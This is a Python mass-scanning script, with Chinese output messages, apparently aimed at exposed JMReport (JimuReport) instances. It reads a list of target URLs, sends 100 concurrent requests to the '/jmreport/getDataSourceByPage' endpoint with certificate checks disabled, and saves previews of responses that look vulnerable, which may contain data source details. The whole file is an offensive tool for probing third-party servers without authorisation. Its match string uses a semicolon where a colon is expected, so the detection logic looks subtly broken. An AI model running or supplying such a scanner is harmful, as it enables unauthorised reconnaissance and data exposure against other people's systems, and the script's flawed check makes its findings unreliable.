import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import os
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VulnerabilityScanner:
    def __init__(self, thread_count=100):
        self.thread_count = thread_count
        self.lock = threading.Lock()
        self.results = []
        
    def check_url(self, url):

        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            target_url = url.rstrip('/') + '/jmreport/getDataSourceByPage'
            response = requests.get(
                target_url,
                verify=False,
                allow_redirects=False,
                timeout=10
            )
            if 300 <= response.status_code < 400:
                print(f"[INFO] {url} - 状态码 {response.status_code} (3xx重定向)，漏洞不存在")
                return None
                
            elif response.status_code == 200:
                if '"success"; true' in response.text:
                    result = {
                        'url': url,
                        'target_url': target_url,
                        'status_code': response.status_code,
                        'response_preview': response.text[:200] + '...' if len(response.text) > 200 else response.text
                    }
                    print(f"[VULNERABLE] {url} - 漏洞存在！")
                    return result
                else:
                    print(f"[INFO] {url} - 状态码 200，但未发现漏洞特征")
                    return None
            else:
                print(f"[INFO] {url} - 状态码 {response.status_code}，漏洞不存在")
                return None
                
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] {url} - 请求失败: {str(e)}")
            return None
        except Exception as e:
            print(f"[ERROR] {url} - 发生错误: {str(e)}")
            return None
    
    def save_result(self, result):
        if result:
            with self.lock:
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write("=" * 50 + "\n")
                    f.write(f"漏洞URL: {result['url']}\n")
                    f.write(f"目标地址: {result['target_url']}\n")
                    f.write(f"状态码: {result['status_code']}\n")
                    f.write(f"响应预览: {result['response_preview']}\n")
                    f.write("=" * 50 + "\n\n")
    
    def load_urls(self, filename):
        urls = []
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    url = line.strip()
                    if url and not url.startswith('#'):  # 跳过空行和注释
                        urls.append(url)
            return urls
        except FileNotFoundError:
            print(f"[ERROR] 文件 {filename} 不存在")
            return []
        except Exception as e:
            print(f"[ERROR] 读取文件时出错: {str(e)}")
            return []
    
    def scan(self, url_file):
   
        print(f"[INFO] 开始加载URL列表...")
        urls = self.load_urls(url_file)
        
        if not urls:
            print("[ERROR] 没有找到有效的URL")
            return
        
        print(f"[INFO] 共加载 {len(urls)} 个URL")
        print(f"[INFO] 开始扫描，线程数: {self.thread_count}")
        print("-" * 50)
        open('result.txt', 'w', encoding='utf-8').close()
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            future_to_url = {
                executor.submit(self.check_url, url): url 
                for url in urls
            }
            completed_count = 0
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    if result:
                        self.save_result(result)
                        self.results.append(result)
                except Exception as e:
                    print(f"[ERROR] 处理 {url} 时发生异常: {str(e)}")
                
                completed_count += 1
                if completed_count % 10 == 0:
                    print(f"[进度] 已完成 {completed_count}/{len(urls)}")

        print("\n" + "=" * 50)
        print(f"[扫描完成]")
        print(f"总URL数: {len(urls)}")
        print(f"发现漏洞: {len(self.results)} 个")
        print(f"结果已保存到: result.txt")
        
        if self.results:
            print("\n发现的漏洞列表:")
            for i, result in enumerate(self.results, 1):
                print(f"{i}. {result['url']}")

def main():
    print("JMReport 数据源漏洞扫描器")
    print("=" * 30)

    url_file = 'url.txt'
    if not os.path.exists(url_file):
        print(f"[错误] 请创建 {url_file} 文件并添加要扫描的URL")
        return  
    scanner = VulnerabilityScanner(thread_count=100)
    start_time = time.time()
    scanner.scan(url_file)
    end_time = time.time()
    
    print(f"\n扫描耗时: {end_time - start_time:.2f} 秒")

if __name__ == "__main__":
    main()